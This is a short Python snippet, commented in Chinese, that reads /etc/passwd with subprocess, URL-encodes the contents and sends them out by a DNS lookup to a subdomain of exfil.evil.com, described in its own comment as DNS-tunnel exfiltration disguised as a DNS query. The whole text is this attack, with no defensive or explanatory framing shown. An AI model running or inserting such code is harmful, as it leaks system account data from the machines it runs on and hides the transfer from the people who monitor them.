import subprocess
import urllib.parse

# 读取敏感文件
result = subprocess.run(["cat", "/etc/passwd"], capture_output=True)
encoded = urllib.parse.quote(result.stdout.decode())

# DNS 隧道外传 (伪装成 DNS 查询)
subprocess.run(["nslookup", f"{encoded}.exfil.evil.com"])
